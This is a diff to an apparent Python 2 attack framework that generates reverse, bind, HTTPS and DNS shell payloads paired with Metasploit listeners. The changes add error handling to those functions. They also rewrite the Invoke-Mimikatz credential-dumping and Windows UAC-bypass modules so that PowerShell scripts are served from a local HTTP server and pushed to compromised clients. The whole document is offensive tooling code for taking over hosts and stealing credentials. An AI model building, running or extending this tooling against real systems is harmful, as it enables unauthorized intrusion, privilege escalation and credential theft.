@@ -28,9 +28,11 @@ def reversePayloadGeneration(payloadchoice,payloadname):
         ez2read_shellcode, startRevMetasploit = askAndReturnModules(shellcode,'nclistener')
     else:
         ez2read_shellcode, startRevMetasploit = askAndReturnModules(shellcode,'reverse')
-    GeneratePayload(ez2read_shellcode,payloadname,shellcode)
-    startRevMetasploit(portnum)
-    return "clear"
+    if GeneratePayload(ez2read_shellcode,payloadname,shellcode):
+        startRevMetasploit(portnum)
+        return "clear"
+    else:
+        return "pass"
 
 def bindPayloadGeneration(payloadchoice,payloadname):
     bindport = raw_input(
@@ -43,9 +45,11 @@ def bindPayloadGeneration(payloadchoice,payloadname):
         '\n[*] Target Bind IP Address ' + t.bold_red + '(REQUIRED FOR BIND PAYLOADS)' + t.normal +' \n[*] IP> ')
     print t.bold_green + '[*] BIND IP SET AS %s\n[*] PORT SET AS %s\n' % (bindip,bindport) + t.normal
     ez2read_shellcode, startBindMetasploit = askAndReturnModules(shellcode,'bind')
-    GeneratePayload(ez2read_shellcode,payloadname,shellcode)
-    startBindMetasploit(bindport,bindip)
-    return "clear"
+    if GeneratePayload(ez2read_shellcode,payloadname,shellcode):
+        startBindMetasploit(bindport,bindip)
+        return "clear"
+    else:
+        return "pass"
 
 def httpsPayloadGeneration(payloadchoice,payloadname):
     portnum,ipaddr = reverseIpAndPort('443')
@@ -53,9 +57,11 @@ def httpsPayloadGeneration(payloadchoice,payloadname):
     shellcode = payloadchoice(ipaddr, portnum)
     print t.bold_green + '[*] IP SET AS %s\n[*] PORT SET AS %s\n' % (ipaddr, portnum) + t.normal
     ez2read_shellcode, startHttpsMetasploit = askAndReturnModules(shellcode,'https')
-    GeneratePayload(ez2read_shellcode,payloadname,shellcode)
-    startHttpsMetasploit(portnum)
-    return "clear"
+    if GeneratePayload(ez2read_shellcode,payloadname,shellcode):
+        startHttpsMetasploit(portnum)
+        return "clear"
+    else:
+        return "pass"
 
 def dnsPayloadGeneration(payloadchoice,payloadname):
     portnum = raw_input(
@@ -71,9 +77,11 @@ def dnsPayloadGeneration(payloadchoice,payloadname):
     shellcode = payloadchoice(DNSaddr, portnum)
     print t.bold_green + '[*] DNS HOSTNAME SET AS %s\n[*] PORT SET AS %s\n' % (DNSaddr, portnum) + t.normal
     ez2read_shellcode, startDnsMetasploit = askAndReturnModules(shellcode,'dns')
-    GeneratePayload(ez2read_shellcode,payloadname,shellcode)
-    startDnsMetasploit(portnum,DNSaddr)
-    return "clear"
+    if GeneratePayload(ez2read_shellcode,payloadname,shellcode):
+        startDnsMetasploit(portnum,DNSaddr)
+        return "clear"
+    else:
+        return "pass"
 
 def reversePowerShellWatchScreenGeneration(payloadchoice,payloadname):
     portnum,ipaddr = reverseIpAndPort('4444')
@@ -115,7 +123,10 @@ def reversePowerShellAskCredsGeneration(payloadchoice,payloadname):
 
 
 def reversePowerShellInvokeMimikatzGeneration(payloadchoice,payloadname):
-    clientnumber = int(clientUpload(payloadname,payloadchoice,isExe=False,json='{"type":"script", "data":"%s", "sendoutput":"true", "multiple":"false"}'))
+    moduleport = FUNCTIONS().randomUnusedPort()
+    FUNCTIONS().DoServe(FUNCTIONS().CheckInternet(), "", "./externalmodules", port = moduleport, printIt = False)
+    powershellScript = payloadchoice % (FUNCTIONS().CheckInternet(), moduleport)
+    clientnumber = int(clientUpload(payloadname,powershellScript,isExe=False,json='{"type":"script", "data":"%s", "sendoutput":"true", "multiple":"false"}'))
     from stager import returnServerList
     try:
         for server in returnServerList():
@@ -130,23 +141,12 @@ def reversePowerShellInvokeMimikatzGeneration(payloadchoice,payloadname):
     return "pass"
 
 def UACBypassGeneration(payloadchoice,payloadname):
-    win7orwin10 = raw_input(t.bold_red + '[*] Windows 7 or 10?' + t.bold_red + ' 7/[10]:' + t.normal)
-    if not win7orwin10:
-        win7orwin10 = "10"
-    if win7orwin10 == "7":
-        json = '{"type":"uacbypass", "data":"%s", "sendoutput":"true"}'% (base64.b64encode(payloadchoice.encode('utf_16_le')))
-    else:
-        json = '{"type":"uacbypass", "data":"%s", "sendoutput":"true"}'% (base64.b64encode(payloadchoice.encode('utf_16_le')))
-    clientnumber = int(checkClientUpload(payloadname,json,isExe=False))
-    from stager import returnServerList
-    try:
-        for server in returnServerList():
-            while True:
-                if server.handlers[clientnumber].in_buffer:
-                    print server.handlers[clientnumber].in_buffer.pop()
-                    break
-                else:
-                    time.sleep(0.1)
-    except KeyboardInterrupt:
-        pass
+    moduleport = FUNCTIONS().randomUnusedPort()
+    FUNCTIONS().DoServe(FUNCTIONS().CheckInternet(), "", "./externalmodules", port = moduleport, printIt = False)
+    encoded = printListener()
+    powershellScript = payloadchoice % (FUNCTIONS().CheckInternet(), moduleport, encoded)
+    print powershellScript
+    clientnumber = int(clientUpload(payloadname,powershellScript,isExe=False,json='{"type":"script", "data":"%s", "sendoutput":"false", "multiple":"false"}'))
+
+
     return "pass"
